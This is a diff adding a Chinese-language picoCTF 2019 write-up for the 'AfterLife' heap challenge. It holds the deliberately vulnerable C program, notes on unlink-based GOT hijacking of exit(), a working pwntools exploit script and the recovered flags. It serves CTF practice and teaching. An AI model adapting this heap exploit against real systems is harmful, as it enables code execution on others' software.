@@ -1204,3 +1204,96 @@ picoCTF{KODIAK_ALANKA}
 找到password opossum 在app裡輸入 
 
 picoCTF{pining.for.the.fjords}
+## AfterLife - Points: 400 - (Solves: 252)Binary Exploitation
+### code
+```c++
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#define FLAG_BUFFER 200
+#define LINE_BUFFER_SIZE 20
+
+void win() {
+  char buf[FLAG_BUFFER];
+  FILE *f = fopen("flag.txt","r");
+  fgets(buf,FLAG_BUFFER,f);
+  fprintf(stdout,"%s\n",buf);
+  fflush(stdout);
+}
+
+int main(int argc, char *argv[])
+{
+   //This is rather an artificial pieace of code taken from Secure Coding in c by Robert C. Seacord 
+   char *first, *second, *third, *fourth;
+   char *fifth, *sixth, *seventh;
+   first=malloc(256);
+   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
+   printf("%d\n",first);
+   strncpy(first,argv[1],LINE_BUFFER_SIZE);
+   second=malloc(256);
+   third=malloc(256);
+   fourth=malloc(256);
+   free(first);
+   free(third);
+   fifth=malloc(128);
+   puts("you will write on first after it was freed... an overflow will not be very useful...");
+   gets(first);
+   seventh=malloc(256);
+   exit(0);
+}
+
+```
+### review
+利用unlink 
+got hijacking 把 exit() 改成 first 的位置
+這樣走到exit() 就跳上first 執行 我們塞上的shellcode 跳上 win()
+
+我一開始的思路是 直接 exit 改成 win 就好了
+不知道位啥 exit 有改成 local死在malloc裡面 
+local remote 都死
+我懷疑是因為unlink它會改到win的 asm 
+而 win 的 opcode 沒有寫入權限 所以才會死
+```python
+from pwn import *
+
+#pico_pass = input('>>')
+pico_ssh = ssh(host='2019shell1.picoctf.com', user='', password='')
+pico_ssh.set_working_directory('/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215')
+
+ 
+# pico_ssh.set_working_directory('/problems/afterlife_1_1a985526d55f084c5fbe4688631e7d51')
+p = pico_ssh.process(['./vuln', 'a'])
+
+# p=process(['./vuln','a'])
+e = ELF('./vuln')
+context.binary = './vuln'
+raw_input('>>>')
+p.recvuntil(b'Oops! a new developer copy pasted and printed an address as a decimal...\n')
+first_addr = int(p.recvline())
+print('fist_addr: ' + str(hex(first_addr)))
+p.recvuntil(b'you will write on first after it was freed... an overflow will not be very useful...\n')
+
+print('exit_addr: ' + str(hex(e.got[b'exit'])))
+print('win_addr: ' + str(hex(e.symbols[b'win'])))
+
+shellcode = asm('push {}; ret;'.format(hex(e.symbols[b'win'])))
+print(b'shellcode: ' + shellcode)
+
+payload = p32(e.got[b'exit']-12)
+# payload += p32(e.symbols[b'win']+8)
+payload += p32(first_addr+8)
+payload += shellcode
+print(b'payload: ' + payload+'  '+str(len(payload)))
+
+p.sendline(payload)
+p.interactive()
+
+# exit_addr: 0x804d02c
+# win_addr: 0x8048966
+
+```
+~~picoCTF{what5_Aft3r_7b3f566a}~~
+picoCTF{what5_Aft3r_187f3d9a}
+資料夾問題 所以flag 不一樣
